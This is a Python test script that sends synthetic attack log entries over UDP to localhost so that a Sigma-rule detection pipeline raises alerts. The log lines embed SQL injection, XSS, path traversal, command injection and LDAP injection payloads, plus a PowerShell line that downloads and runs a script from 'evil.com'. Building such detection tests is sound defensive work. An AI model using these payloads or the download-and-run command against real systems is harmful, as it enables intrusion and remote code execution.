"""
Send Malicious Test Logs

Send logs that should trigger Sigma rules.
"""

import socket
import time
import json

def send_malicious_logs():
    """Send logs that match Sigma rules."""
    
    logs = [
        # SQL Injection attempt (Nginx)
        '192.168.1.100 - - [06/Dec/2025:10:00:00 +0000] "GET /login.php?id=1\' OR \'1\'=\'1 HTTP/1.1" 200 512 "-" "curl/7.68.0"',
        
        # XSS attempt (Nginx)
        '192.168.1.100 - - [06/Dec/2025:10:00:01 +0000] "GET /search?q=<script>alert(1)</script> HTTP/1.1" 200 1024 "-" "Mozilla/5.0"',
        
        # Windows failed login (Event ID 4625)
        json.dumps({
            "timestamp": "2025-12-06 10:00:02",
            "hostname": "WIN-SERVER",
            "channel": "Security",
            "event_id": 4625,
            "level": "Information",
            "message": "An account failed to log on"
        }),
        
        # Linux SSH brute force
        'Dec  6 10:00:03 linux-server sshd[1234]: Failed password for invalid user admin from 192.168.1.100 port 22 ssh2',
        
        # Path traversal (Nginx)
        '192.168.1.100 - - [06/Dec/2025:10:00:04 +0000] "GET /../../../etc/passwd HTTP/1.1" 404 512 "-" "curl/7.68.0"',
        
        # Windows RDP brute force (Event ID 4625 from RDP)
        json.dumps({
            "timestamp": "2025-12-06 10:00:05",
            "hostname": "WIN-RDP",
            "channel": "Security",
            "event_id": 4625,
            "level": "Information",
            "message": "An account failed to log on. Logon Type: 10"
        }),
        
        # Command injection (Nginx)
        '192.168.1.100 - - [06/Dec/2025:10:00:06 +0000] "GET /exec?cmd=cat%20/etc/passwd HTTP/1.1" 200 2048 "-" "curl/7.68.0"',
        
        # Linux sudo abuse
        'Dec  6 10:00:07 linux-server sudo: attacker : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash',
        
        # Windows PowerShell execution
        json.dumps({
            "timestamp": "2025-12-06 10:00:08",
            "hostname": "WIN-WS01",
            "channel": "Microsoft-Windows-PowerShell/Operational",
            "event_id": 4104,
            "level": "Information",
            "message": "Creating Scriptblock text (1 of 1): Invoke-Expression (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
        }),
        
        # LDAP injection (Nginx)
        '192.168.1.100 - - [06/Dec/2025:10:00:09 +0000] "POST /login HTTP/1.1" 200 512 "-" "Mozilla/5.0" "username=admin)(cn=*))(|(cn=*"',
    ]
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    print("="*80)
    print("Sending Malicious Test Logs (Should Trigger Sigma Rules)")
    print("="*80)
    print(f"Target: 127.0.0.1:514")
    print(f"Logs to send: {len(logs)}")
    print("="*80)
    
    for i, log in enumerate(logs, 1):
        sock.sendto(log.encode(), ("127.0.0.1", 5140))
        print(f"\n[{i}/{len(logs)}] ✓ Sent malicious log")
        if len(log) > 100:
            print(f"  Preview: {log[:100]}...")
        else:
            print(f"  Content: {log}")
        time.sleep(0.5)
    
    sock.close()
    
    print("\n" + "="*80)
    print(f"✅ Successfully sent {len(logs)} malicious logs")
    print("="*80)
    print("\n📋 Next Steps:")
    print("  1. Wait 5-10 seconds for ingestion worker to process")
    print("  2. Check logs: python inspect_db.py")
    print("  3. Run Sigma worker: python -m src.workers.sigma_rule_worker")
    print("  4. Check alerts in database")
    print("="*80)

if __name__ == "__main__":
    send_malicious_logs()
